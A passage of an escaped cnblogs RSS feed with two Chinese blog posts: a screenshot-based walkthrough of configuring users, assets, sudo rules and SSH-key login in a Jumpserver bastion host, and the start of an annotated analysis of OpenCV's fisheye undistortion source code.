&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230346528-352940804.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;输入要添加的用户名，姓名，权限，&lt;/span&gt;&lt;span&gt;Mail&lt;/span&gt;&lt;span&gt;，并且发送邮件&lt;/span&gt; &lt;span&gt;—&amp;gt;&lt;/span&gt; &lt;span&gt;保存&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230347231-174091609.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;查看添加的用户&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230347934-1871033551.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;查看用户邮件&lt;/span&gt;&lt;span&gt; &lt;br/&gt;&lt;/span&gt;&lt;span&gt;邮件中包含了用户名，权限，&lt;/span&gt;&lt;span&gt;web&lt;/span&gt;&lt;span&gt;密码，&lt;/span&gt;&lt;span&gt;ssh&lt;/span&gt; &lt;span&gt;密钥密码，以及密钥下载地址。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230348450-1935296304.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230348700-938165572.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;2&lt;/span&gt;&lt;span&gt;）添加用户组&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;点击用户管理&lt;/span&gt; &lt;span&gt;—&amp;gt;&lt;/span&gt; &lt;span&gt;查看用户组&lt;/span&gt; &lt;span&gt;—&amp;gt;&lt;/span&gt; &lt;span&gt;添加用户组&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230349091-1446713264.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230349419-1993762805.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;添加新的小组&lt;/span&gt; &lt;span&gt;—&amp;gt;&lt;/span&gt; &lt;span&gt;运维小组&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230350466-884955907.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230350731-148785624.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;查看刚才添加的组&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230351513-1754384469.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230351794-1002436948.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h2&gt;二、资产管理&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;1&lt;/span&gt;&lt;span&gt;）添加资产组&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;点击资产管理&lt;/span&gt; &lt;span&gt;—&amp;gt;&lt;/span&gt; &lt;span&gt;查看资产组&lt;/span&gt; &lt;span&gt;—&amp;gt;&lt;/span&gt; &lt;span&gt;添加主机组&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230352747-1157511898.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;输入组名称，并且输入描述组用途&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230353434-1474578274.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230353638-1338982474.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;2&lt;/span&gt;&lt;span&gt;）添加资产&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;点击资产管理&lt;/span&gt; &lt;span&gt;—&amp;gt;&lt;/span&gt; &lt;span&gt;查看资产&lt;/span&gt; &lt;span&gt;—&amp;gt;&lt;/span&gt; &lt;span&gt;添加资产&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230354044-1960088655.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;输入主机名，主机&lt;/span&gt;&lt;span&gt;IP&lt;/span&gt;&lt;span&gt;，管理用户名（管理员用户，主机中必须存在的哦&lt;/span&gt;&lt;span&gt;~&lt;/span&gt; &lt;span&gt;可以是&lt;/span&gt;&lt;span&gt;root&lt;/span&gt;&lt;span&gt;），端口，资产组&lt;/span&gt; &lt;span&gt;—&amp;gt;&lt;/span&gt; &lt;span&gt;提交保存&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230354606-358995597.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230354809-395767668.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;3&lt;/span&gt;&lt;span&gt;）添加机房&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;点击资产管理&lt;/span&gt; &lt;span&gt;—&amp;gt;&lt;/span&gt; &lt;span&gt;查看机房&lt;/span&gt; &lt;span&gt;—&amp;gt;&lt;/span&gt; &lt;span&gt;添加机房&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230355309-2103340920.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;输入机房名称，其他的可以选填&lt;/span&gt; &lt;span&gt;—&amp;gt;&lt;/span&gt; &lt;span&gt;保存&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230355809-263055566.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230356278-41586503.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h2&gt;三、权限管理&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;1&lt;/span&gt;&lt;span&gt;）&lt;/span&gt;&lt;span&gt;sudo&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;点击权限管理&lt;/span&gt; &lt;span&gt;—&amp;gt; sudo —&amp;gt;&lt;/span&gt; &lt;span&gt;添加别名&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230357013-1732197538.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;输入别名，系统命令，备注&lt;/span&gt; &lt;span&gt;—&amp;gt;&lt;/span&gt; &lt;span&gt;点击保存&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230357856-1626686997.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230358044-2032199179.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;2&lt;/span&gt;&lt;span&gt;）添加系统用户&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;点击授权管理&lt;/span&gt; &lt;span&gt;—&amp;gt;&lt;/span&gt; &lt;span&gt;系统用户&lt;/span&gt; &lt;span&gt;—&amp;gt;&lt;/span&gt; &lt;span&gt;添加系统用户&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230358763-347230106.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;输入用户名，密码，管理的&lt;/span&gt;&lt;span&gt;sudo&lt;/span&gt;&lt;span&gt;及备注&lt;/span&gt; &lt;span&gt;—&amp;gt;&lt;/span&gt; &lt;span&gt;单击保存&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230359497-1332074218.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;创建好系统之后，单击推送，将用户名、密码、&lt;/span&gt;&lt;span&gt;sudo&lt;/span&gt;&lt;span&gt;的信息推送到服务器。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230400388-1377007185.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;选择系统用户，资产组&lt;/span&gt; &lt;span&gt;—&amp;gt;&lt;/span&gt; &lt;span&gt;单击保存&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230400950-469874680.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;推送成功&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230401184-1541809746.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230401419-922325938.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;3&lt;/span&gt;&lt;span&gt;）授权规则&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;点击授权管理&lt;/span&gt; &lt;span&gt;—&amp;gt;&lt;/span&gt; &lt;span&gt;授权规则&lt;/span&gt; &lt;span&gt;—&amp;gt;&lt;/span&gt; &lt;span&gt;添加规则&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230401903-1816476373.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;输入授权名称，用户&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;用户组，资产&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;资产组，系统用户，备注&lt;/span&gt; &lt;span&gt;—&amp;gt;&lt;/span&gt; &lt;span&gt;单击保存&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230402434-278237735.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230402763-287770741.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h2&gt;四、登录&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;这时候创建已经完成，下一步用户&lt;/span&gt;&lt;span&gt;&quot;hongxue&quot;&lt;/span&gt;&lt;span&gt;通过&lt;/span&gt;&lt;span&gt;web&lt;/span&gt;&lt;span&gt;和密钥登录堡垒机&lt;/span&gt; &lt;span&gt;192.168.1.200&lt;/span&gt;&lt;span&gt;，并实现跳转到服务器&lt;/span&gt; &lt;span&gt;192.168.1.210&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;1&lt;/span&gt;&lt;span&gt;）通过&lt;/span&gt;&lt;span&gt;web&lt;/span&gt;&lt;span&gt;登录&lt;/span&gt;&lt;span&gt; &lt;br/&gt;&lt;/span&gt;&lt;span&gt;可以看到用户&lt;/span&gt;&lt;span&gt;ID&lt;/span&gt;&lt;span&gt;，用户名，权限，&lt;/span&gt;&lt;span&gt;key&lt;/span&gt;&lt;span&gt;，最后登录，用户组，授权主机数，以及主机信息。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230403856-1069391539.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;单击查看主机&lt;/span&gt; &lt;span&gt;—&amp;gt;&lt;/span&gt; &lt;span&gt;连接&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230405028-1743176456.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;连接成功，可以对该主机进行操作。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230406325-611694106.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230406684-346322336.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;2&lt;/span&gt;&lt;span&gt;）通过&lt;/span&gt;&lt;span&gt;ssh&lt;/span&gt;&lt;span&gt;登录&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;通过邮件中收到的地址，下载&lt;/span&gt;&lt;span&gt;key&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230407544-630098500.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;点击工具&lt;/span&gt; &lt;span&gt;—&amp;gt;&lt;/span&gt; &lt;span&gt;用户密钥管理者&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230408356-747921485.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;单击导入&lt;/span&gt; &lt;span&gt;—&amp;gt;&lt;/span&gt; &lt;span&gt;输入用户名，密码&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230408794-302475651.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;连接&lt;/span&gt; &lt;span&gt;jumpserver&lt;/span&gt; &lt;span&gt;堡垒机&lt;/span&gt; &lt;span&gt;192.168.1.200&lt;/span&gt;&lt;span&gt;，输入密钥密码进行登录&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230409700-1489049696.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;登录成功！！&lt;/span&gt;&lt;span&gt;从授权的列表中连接到服务器&lt;/span&gt; &lt;span&gt;192.168.1.210&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230410153-1299965740.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Thu, 09 Nov 2017 14:57:00 +0000</pubDate>
<dc:creator>jks巴顿</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/jksbaduen/p/7811909.html</dc:identifier>
</item>
<item>
<title>OpenCV两种畸变校正模型源代码分析以及CUDA实现 - 一棹烟波</title>
<link>http://www.cnblogs.com/riddick/p/7811877.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/riddick/p/7811877.html</guid>
<description>&lt;p&gt;&lt;span&gt;图像算法中会经常用到摄像机的畸变校正，有必要总结分析OpenCV中畸变校正方法，其中包括普通针孔相机模型和鱼眼相机模型fisheye两种畸变校正方法。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;普通相机模型畸变校正函数针对OpenCV中的cv::initUndistortRectifyMap()，鱼眼相机模型畸变校正函数对应OpenCV中的cv::fisheye::initUndistortRectifyMap()。两种方法算出映射Mapx和Mapy后，统一用cv::Remap()函数进行插值得到校正后的图像。&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;1. FishEye模型的畸变校正。&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;方便起见，直接贴出OpenCV源码，我在里面加了注释说明。建议参考OpenCV官方文档看畸变模型原理会更清楚：&lt;a href=&quot;https://docs.opencv.org/3.0-beta/modules/calib3d/doc/camera_calibration_and_3d_reconstruction.html#fisheye-initundistortrectifymap&quot; target=&quot;_blank&quot;&gt;https://docs.opencv.org/3.0-beta/modules/calib3d/doc/camera_calibration_and_3d_reconstruction.html#fisheye-initundistortrectifymap&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;简要流程就是：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;1. 求内参矩阵的逆，由于摄像机坐标系的三维点到二维图像平面，需要乘以旋转矩阵R和内参矩阵K。那么反向投影回去则是二维图像坐标乘以  K*R的逆矩阵。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;2. 将目标图像中的每一个像素点坐标(j,i)，乘以1中求出的逆矩阵iR，转换到摄像机坐标系（_x,_y,_w）,并归一化得到z=1平面下的三维坐标(x,y,1)；&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;3.求出平面模型下像素点对应鱼眼半球模型下的极坐标(r, theta)。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;4.利用鱼眼畸变模型求出拥有畸变时像素点对应的theta_d。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1138496/201711/1138496-20171109224351278-1646598593.png&quot; alt=&quot;&quot; width=&quot;715&quot; height=&quot;510&quot;/&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;5.利用求出的theta_d值将三维坐标点重投影到二维图像平面得到(u,v)，(u,v)即为目标图像对应的畸变图像中像素点坐标&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;6.使用cv::Remap（）函数，根据mapx,mapy取出对应坐标位置的像素值赋值给目标图像，一般采用双线性插值法，得到畸变校正后的目标图像。&lt;/span&gt;&lt;/p&gt;

&lt;div class=&quot;cnblogs_code&quot; readability=&quot;92&quot;&gt;
&lt;pre&gt;
#include &amp;lt;opencv2\opencv.hpp&amp;gt;

&lt;span&gt;void&lt;/span&gt;&lt;span&gt; cv::fisheye::initUndistortRectifyMap( InputArray K, InputArray D, InputArray R, InputArray P,
    &lt;/span&gt;&lt;span&gt;const&lt;/span&gt; cv::Size&amp;amp; size, &lt;span&gt;int&lt;/span&gt;&lt;span&gt; m1type, OutputArray map1, OutputArray map2 )
{
    CV_Assert( m1type &lt;/span&gt;== CV_16SC2 || m1type == CV_32F || m1type &amp;lt;=&lt;span&gt;0&lt;/span&gt;&lt;span&gt; );
    map1.create( size, m1type &lt;/span&gt;&amp;lt;= &lt;span&gt;0&lt;/span&gt; ?&lt;span&gt; CV_16SC2 : m1type );
    map2.create( size, map1.type() &lt;/span&gt;== CV_16SC2 ?&lt;span&gt; CV_16UC1 : CV_32F );

    CV_Assert((K.depth() &lt;/span&gt;== CV_32F || K.depth() == CV_64F) &amp;amp;&amp;amp; (D.depth() == CV_32F || D.depth() ==&lt;span&gt; CV_64F));
    CV_Assert((P.empty() &lt;/span&gt;|| P.depth() == CV_32F || P.depth() == CV_64F) &amp;amp;&amp;amp; (R.empty() || R.depth() == CV_32F || R.depth() ==&lt;span&gt; CV_64F));
    CV_Assert(K.size() &lt;/span&gt;== Size(&lt;span&gt;3&lt;/span&gt;, &lt;span&gt;3&lt;/span&gt;) &amp;amp;&amp;amp; (D.empty() || D.total() == &lt;span&gt;4&lt;/span&gt;&lt;span&gt;));
    CV_Assert(R.empty() &lt;/span&gt;|| R.size() == Size(&lt;span&gt;3&lt;/span&gt;, &lt;span&gt;3&lt;/span&gt;) || R.total() * R.channels() == &lt;span&gt;3&lt;/span&gt;&lt;span&gt;);
    CV_Assert(P.empty() &lt;/span&gt;|| P.size() == Size(&lt;span&gt;3&lt;/span&gt;, &lt;span&gt;3&lt;/span&gt;) || P.size() == Size(&lt;span&gt;4&lt;/span&gt;, &lt;span&gt;3&lt;/span&gt;&lt;span&gt;));

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;从内参矩阵K中取出归一化焦距fx,fy; cx,cy&lt;/span&gt;
&lt;span&gt;    cv::Vec2d f, c;
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (K.depth() ==&lt;span&gt; CV_32F)
    {
        Matx33f camMat &lt;/span&gt;=&lt;span&gt; K.getMat();
        f &lt;/span&gt;= Vec2f(camMat(&lt;span&gt;0&lt;/span&gt;, &lt;span&gt;0&lt;/span&gt;), camMat(&lt;span&gt;1&lt;/span&gt;, &lt;span&gt;1&lt;/span&gt;&lt;span&gt;));
        c &lt;/span&gt;= Vec2f(camMat(&lt;span&gt;0&lt;/span&gt;, &lt;span&gt;2&lt;/span&gt;), camMat(&lt;span&gt;1&lt;/span&gt;, &lt;span&gt;2&lt;/span&gt;&lt;span&gt;));
    }
    &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
    {
        Matx33d camMat &lt;/span&gt;=&lt;span&gt; K.getMat();
        f &lt;/span&gt;= Vec2d(camMat(&lt;span&gt;0&lt;/span&gt;, &lt;span&gt;0&lt;/span&gt;), camMat(&lt;span&gt;1&lt;/span&gt;, &lt;span&gt;1&lt;/span&gt;&lt;span&gt;));
        c &lt;/span&gt;= Vec2d(camMat(&lt;span&gt;0&lt;/span&gt;, &lt;span&gt;2&lt;/span&gt;), camMat(&lt;span&gt;1&lt;/span&gt;, &lt;span&gt;2&lt;/span&gt;&lt;span&gt;));
    }
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;从畸变系数矩阵D中取出畸变系数k1,k2,k3,k4&lt;/span&gt;
    Vec4d k = Vec4d::all(&lt;span&gt;0&lt;/span&gt;&lt;span&gt;);
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;D.empty())
        k &lt;/span&gt;= D.depth() == CV_32F ? (Vec4d)*D.getMat().ptr&amp;lt;Vec4f&amp;gt;(): *D.getMat().ptr&amp;lt;Vec4d&amp;gt;&lt;span&gt;();

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;旋转矩阵RR转换数据类型为CV_64F，如果不需要旋转，则RR为单位阵&lt;/span&gt;
    cv::Matx33d RR  =&lt;span&gt; cv::Matx33d::eye();
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!R.empty() &amp;amp;&amp;amp; R.total() * R.channels() == &lt;span&gt;3&lt;/span&gt;&lt;span&gt;)
    {
        cv::Vec3d rvec;
        R.getMat().convertTo(rvec, CV_64F);
        RR &lt;/span&gt;=&lt;span&gt; Affine3d(rvec).rotation();
    }
    &lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; (!R.empty() &amp;amp;&amp;amp; R.size() == Size(&lt;span&gt;3&lt;/span&gt;, &lt;span&gt;3&lt;/span&gt;&lt;span&gt;))
        R.getMat().convertTo(RR, CV_64F);
    
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;新的内参矩阵PP转换数据类型为CV_64F&lt;/span&gt;
    cv::Matx33d PP =&lt;span&gt; cv::Matx33d::eye();
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;P.empty())
        P.getMat().colRange(&lt;/span&gt;&lt;span&gt;0&lt;/span&gt;, &lt;span&gt;3&lt;/span&gt;&lt;span&gt;).convertTo(PP, CV_64F);

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;关键一步：新的内参矩阵*旋转矩阵，然后利用SVD分解求出逆矩阵iR，后面用到&lt;/span&gt;
    cv::Matx33d iR = (PP *&lt;span&gt; RR).inv(cv::DECOMP_SVD);

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;反向映射，遍历目标图像所有像素位置，找到畸变图像中对应位置坐标(u,v)，并分别保存坐标(u,v)到mapx和mapy中&lt;/span&gt;
    &lt;span&gt;for&lt;/span&gt;( &lt;span&gt;int&lt;/span&gt; i = &lt;span&gt;0&lt;/span&gt;; i &amp;lt; size.height; ++&lt;span&gt;i)
    {
        &lt;/span&gt;&lt;span&gt;float&lt;/span&gt;* m1f = map1.getMat().ptr&amp;lt;&lt;span&gt;float&lt;/span&gt;&amp;gt;&lt;span&gt;(i);
        &lt;/span&gt;&lt;span&gt;float&lt;/span&gt;* m2f = map2.getMat().ptr&amp;lt;&lt;span&gt;float&lt;/span&gt;&amp;gt;&lt;span&gt;(i);
        &lt;/span&gt;&lt;span&gt;short&lt;/span&gt;*  m1 = (&lt;span&gt;short&lt;/span&gt;*&lt;span&gt;)m1f;
        &lt;/span&gt;&lt;span&gt;ushort&lt;/span&gt;* m2 = (&lt;span&gt;ushort&lt;/span&gt;*&lt;span&gt;)m2f;

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;二维图像平面坐标系-&amp;gt;摄像机坐标系&lt;/span&gt;
        &lt;span&gt;double&lt;/span&gt; _x = i*iR(&lt;span&gt;0&lt;/span&gt;, &lt;span&gt;1&lt;/span&gt;) + iR(&lt;span&gt;0&lt;/span&gt;, &lt;span&gt;2&lt;/span&gt;&lt;span&gt;),
               _y &lt;/span&gt;= i*iR(&lt;span&gt;1&lt;/span&gt;, &lt;span&gt;1&lt;/span&gt;) + iR(&lt;span&gt;1&lt;/span&gt;, &lt;span&gt;2&lt;/span&gt;&lt;span&gt;),
               _w &lt;/span&gt;= i*iR(&lt;span&gt;2&lt;/span&gt;, &lt;span&gt;1&lt;/span&gt;) + iR(&lt;span&gt;2&lt;/span&gt;, &lt;span&gt;2&lt;/span&gt;&lt;span&gt;);

        &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;( &lt;span&gt;int&lt;/span&gt; j = &lt;span&gt;0&lt;/span&gt;; j &amp;lt; size.width; ++&lt;span&gt;j)
        {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;归一化摄像机坐标系，相当于假定在Z=1平面上&lt;/span&gt;
            &lt;span&gt;double&lt;/span&gt; x = _x/_w, y = _y/&lt;span&gt;_w;

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;求鱼眼半球体截面半径r&lt;/span&gt;
            &lt;span&gt;double&lt;/span&gt; r = sqrt(x*x + y*&lt;span&gt;y);
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;求鱼眼半球面上一点与光心的连线和光轴的夹角Theta&lt;/span&gt;
            &lt;span&gt;double&lt;/span&gt; theta =&lt;span&gt; atan(r);
